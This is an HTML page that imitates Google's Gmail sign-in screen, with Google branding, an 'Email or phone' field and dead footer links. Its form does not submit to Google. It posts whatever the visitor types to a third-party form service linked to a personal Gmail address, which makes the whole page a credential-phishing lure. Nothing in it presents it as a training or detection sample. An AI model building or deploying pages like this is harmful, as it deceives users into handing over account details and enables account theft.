<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="google-logo">Google</div>
        <h1 class="signin-title">Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <form action="https://formspree.io/f/sharearealif7@gmail.com" method="POST" class="signin-form">
            <div class="input-box">
                <input type="text" id="email" name="email" required>
                <label for="email">Email or phone</label>
            </div>
            <a href="#" class="forgot-email">Forgot email?</a>

            <p class="guest-mode">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>

            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>

        <div class="footer">
            <select class="lang-select">
                <option>English (United States)</option>
            </select>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
